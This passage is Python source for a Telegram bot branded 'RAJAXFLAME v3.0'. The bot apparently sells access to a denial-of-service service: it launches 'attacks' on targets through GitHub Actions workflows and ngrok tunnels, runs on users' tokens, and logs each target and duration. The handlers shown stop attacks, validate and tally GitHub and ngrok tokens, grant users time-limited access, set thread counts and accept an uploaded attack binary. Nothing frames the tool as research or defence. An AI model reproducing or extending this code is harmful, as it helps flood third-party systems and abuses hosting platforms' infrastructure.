            tunnel_data = create_ngrok_tunnel(token, 8080)
            if tunnel_data:
                tunnel_url = extract_tunnel_url(tunnel_data)
                status += f" | ✅ Tunnel: {tunnel_url[:30]}..." if tunnel_url else " | ❌ Tunnel failed"
            else:
                status += " | ❌ Tunnel failed"
        
        results.append(f"Token {i}: {status}")
        
        # Cleanup
        if tunnel_data and 'id' in tunnel_data:
            delete_ngrok_tunnel(token, tunnel_data['id'])
    
    report = "🔧 **Ngrok Tunnel Test Results:**\n\n" + "\n".join(results)
    await msg.edit_text(report)

async def cmd_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **RAJAXFLAME ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("Stop Attack", callback_data="stop_attack")],
        [InlineKeyboardButton("View Logs", callback_data="view_logs")],
        [InlineKeyboardButton("Manage Users", callback_data="manage_users")],
        [InlineKeyboardButton("Check Tokens", callback_data="check_tokens")]
    ])
    
    control_text = """
🎮 **RAJAXFLAME CONTROL PANEL**

🔹 Stop ongoing attacks
🔹 View attack history
🔹 Manage approved users
🔹 Check token validity
"""
    await send_rajaxflame_message(context, update.effective_chat.id, control_text, "control", reply_markup=kb)

async def cmd_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **RAJAXFLAME ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    
    logs = load_json(ATTACK_LOGS_FILE, [])
    if not logs:
        await send_rajaxflame_message(context, update.effective_chat.id, "📜 **No Attack Logs Found**", "status")
        return
    
    log_text = "📜 **RAJAXFLAME ATTACK LOGS**\n\n"
    for log in logs[-10:]:
        log_text += f"""
🕒 **Time**: {log['start_time'][11:19]} UTC
👤 **User ID**: {log['user_id']}
🎯 **Target**: {log['target']}
⏱ **Duration**: {log['duration']}s
⚡ **Workflows**: {log['workflows']}
🌐 **Tunnel**: {'YES' if log['tunnel'] else 'NO'}
{'-'*30}
"""
    await send_rajaxflame_message(context, update.effective_chat.id, log_text, "status")

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    msg = await update.message.reply_text("Checking tokens…")
    await asyncio.sleep(0.4)
    try:
        await msg.edit_text("Checking tokens ▰▱▱")
    except Exception:
        pass
    
    github_lines = load_github_tokens()
    ngrok_lines = load_ngrok_tokens()
    
    if is_admin(user_id):
        results = {"github": {}, "ngrok": {}}
        for i, line in enumerate(github_lines, 1):
            u, tok = line.split(":", 1)
            alive = validate_github_token(tok)
            results["github"].setdefault(u, {})[tok[:10] + "…"] = "live" if alive else "dead"
            if i % 5 == 0:
                try:
                    await msg.edit_text(f"Progress {i}/{len(github_lines)}")
                except Exception:
                    pass
        for i, line in enumerate(ngrok_lines, 1):
            u, tok = line.split(":", 1)
            alive = validate_ngrok_token(tok)
            results["ngrok"].setdefault(u, {})[tok[:10] + "…"] = "live" if alive else "dead"
        save_json(TOKENS_STATUS_FILE, results)
        await update.message.reply_document(InputFile(TOKENS_STATUS_FILE))
        try:
            await msg.edit_text("Done.")
        except Exception:
            pass
    else:
        github_own = [ln for ln in github_lines if ln.startswith(f"{user_id}:")]
        ngrok_own = [ln for ln in ngrok_lines if ln.startswith(f"{user_id}:")]
        github_live = github_dead = ngrok_live = ngrok_dead = 0
        rows = []
        for i, line in enumerate(github_own, 1):
            _, tok = line.split(":", 1)
            ok = validate_github_token(tok)
            if ok:
                github_live += 1
                rows.append(f"GitHub {tok[:12]}…: ✅ live")
            else:
                github_dead += 1
                rows.append(f"GitHub {tok[:12]}…: ❌ dead")
        for i, line in enumerate(ngrok_own, 1):
            _, tok = line.split(":", 1)
            ok = validate_ngrok_token(tok)
            if ok:
                ngrok_live += 1
                rows.append(f"Ngrok {tok[:12]}…: ✅ live")
            else:
                ngrok_dead += 1
                rows.append(f"Ngrok {tok[:12]}…: ❌ dead")
        final_text = "Your tokens:\n" + "\n".join(rows) + f"\n\nGitHub: {github_live} live, {github_dead} dead\nNgrok: {ngrok_live} live, {ngrok_dead} dead"
        try:
            await msg.edit_text(final_text)
        except Exception:
            await update.message.reply_text(final_text)

async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **RAJAXFLAME ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    if len(context.args) != 2:
        await update.message.reply_text("💡 **RAJAXFLAME Usage:** /add USERID DAYS")
        return
    try:
        target_user = int(context.args[0])
        days = int(context.args[1])
        add_user(target_user, days)
        await update.message.reply_text(f"✅ **RAJAXFLAME USER {target_user} ADDED FOR {days} DAYS**")
    except ValueError:
        await update.message.reply_text("❌ **RAJAXFLAME INVALID USERID OR DAYS**")

async def cmd_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **RAJAXFLAME ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("💡 **RAJAXFLAME Usage:** /remove USERID")
        return
    try:
        target_user = int(context.args[0])
        remove_user(target_user)
        await update.message.reply_text(f"✅ **RAJAXFLAME USER {target_user} REMOVED**")
    except ValueError:
        await update.message.reply_text("❌ **RAJAXFLAME INVALID USERID**")

async def cmd_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text(f"❌ **RAJAXFLAME OWNER ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("💡 **RAJAXFLAME Usage:** /addadmin USERID")
        return
    try:
        target_user = int(context.args[0])
        add_admin(target_user)
        await update.message.reply_text(f"✅ **RAJAXFLAME ADMIN {target_user} ADDED**")
    except ValueError:
        await update.message.reply_text("❌ **RAJAXFLAME INVALID USERID**")

async def cmd_removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text(f"❌ **RAJAXFLAME OWNER ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    if len(context.args) != 1:
        await update.message.reply_text("💡 **RAJAXFLAME Usage:** /removeadmin USERID")
        return
    try:
        target_user = int(context.args[0])
        remove_admin(target_user)
        await update.message.reply_text(f"✅ **RAJAXFLAME ADMIN {target_user} REMOVED**")
    except ValueError:
        await update.message.reply_text("❌ **RAJAXFLAME INVALID USERID**")

async def cmd_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **RAJAXFLAME ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    if not context.args:
        await update.message.reply_text("💡 **RAJAXFLAME Usage:** /threads NUMBER")
        return
    try:
        threads = int(context.args[0])
        set_default_threads(threads)
        await update.message.reply_text(f"✅ **Default threads set to {threads}**")
    except ValueError:
        await update.message.reply_text("❌ **Invalid number**")

async def cmd_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **RAJAXFLAME ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    await update.message.reply_text(f"📤 **Upload binary named '{BINARY_NAME}' now**")

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if not is_admin(user_id):
        await update.message.reply_text(f"❌ **RAJAXFLAME ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
        return
    status = ATTACK_STATUS.get(chat_id, {})
    if not status.get("running"):
        await send_rajaxflame_message(context, chat_id, "💤 **No Active Attacks to Stop**", "control")
        return
    try:
        gh_delete_repo(status["github_token"], status["repo"])
        if status["tunnel_used"] and chat_id in ACTIVE_TUNNELS:
            ngrok_token = ACTIVE_TUNNELS[chat_id]["token"]
            delete_ngrok_tunnel(ngrok_token, ACTIVE_TUNNELS[chat_id]["data"]["id"])
            del ACTIVE_TUNNELS[chat_id]
        ATTACK_STATUS[chat_id]["running"] = False
        await send_rajaxflame_message(context, chat_id, "🛑 **Attack Stopped Successfully**", "control")
    except Exception as e:
        await send_rajaxflame_message(context, chat_id, f"⚠️ **Failed to Stop Attack**: {str(e)}", "control")

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    doc = update.message.document
    if not doc:
        return
    if doc.file_name == BINARY_NAME and is_admin(user_id):
        if os.path.exists(BINARY_PATH):
            os.remove(BINARY_PATH)
        f = await doc.get_file()
        await f.download_to_drive(custom_path=BINARY_PATH)
        await update.message.reply_text(f"✅ **Binary '{BINARY_NAME}' saved**")

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = update.effective_chat.id
    if query.data == "stop_attack":
        status = ATTACK_STATUS.get(chat_id, {})
        if not status.get("running"):
            await query.edit_message_text("💤 **No Active Attacks to Stop**")
            return
        try:
            gh_delete_repo(status["github_token"], status["repo"])
            if status["tunnel_used"] and chat_id in ACTIVE_TUNNELS:
                ngrok_token = ACTIVE_TUNNELS[chat_id]["token"]
                delete_ngrok_tunnel(ngrok_token, ACTIVE_TUNNELS[chat_id]["data"]["id"])
                del ACTIVE_TUNNELS[chat_id]
            ATTACK_STATUS[chat_id]["running"] = False
            await query.edit_message_text("🛑 **Attack Stopped Successfully**")
        except Exception as e:
            await query.edit_message_text(f"⚠️ **Failed to Stop Attack**: {str(e)}")
    elif query.data == "view_logs":
        logs = load_json(ATTACK_LOGS_FILE, [])
        if not logs:
            await query.edit_message_text("📜 **No Attack Logs Found**")
            return
        log_text = "📜 **RAJAXFLAME ATTACK LOGS**\n\n"
        for log in logs[-10:]:
            log_text += f"""
🕒 **Time**: {log['start_time'][11:19]} UTC
👤 **User ID**: {log['user_id']}
🎯 **Target**: {log['target']}
⏱ **Duration**: {log['duration']}s
⚡ **Workflows**: {log['workflows']}
🌐 **Tunnel**: {'YES' if log['tunnel'] else 'NO'}
{'-'*30}
"""
        await query.edit_message_text(log_text)
    elif query.data == "manage_users":
        if not os.path.exists(USERS_FILE):
            save_json(USERS_FILE, {})
        await query.message.reply_document(InputFile(USERS_FILE))
    elif query.data == "check_tokens":
        await cmd_check(update, context)

# ================ 🏗️ APPLICATION BUILDER 🏗️ ================
def build_rajaxflame_app():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Existing handlers
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("setgithub", cmd_setgithub))
    app.add_handler(CommandHandler("setngrok", cmd_setngrok))
    app.add_handler(CommandHandler("status", cmd_status))
    
    # 🆕 NEW TUNNEL COMMANDS
    app.add_handler(CommandHandler("tunnelstatus", cmd_tunnel_status))
    app.add_handler(CommandHandler("mytunnels", cmd_my_tunnels))
    app.add_handler(CommandHandler("tunneltest", cmd_tunnel_test))
    
    # Rest of handlers
    app.add_handler(CommandHandler("control", cmd_control))
    app.add_handler(CommandHandler("logs", cmd_logs))
    app.add_handler(CommandHandler("add", cmd_add))
    app.add_handler(CommandHandler("remove", cmd_remove))
    app.add_handler(CommandHandler("addadmin", cmd_addadmin))
    app.add_handler(CommandHandler("removeadmin", cmd_removeadmin))
    app.add_handler(CommandHandler("threads", cmd_threads))
    app.add_handler(CommandHandler("file", cmd_file))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    
    return app

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    print("""
╔══════════════════════════════╗
║    🔥 **RAJAXFLAME v3.0**    ║
║    ⚡ **ULTRA INSTANT**      ║
║    💥 **10x WORKFLOWS**     ║
╚══════════════════════════════╝
    """)
    app = build_rajaxflame_app()
    app.run_polling()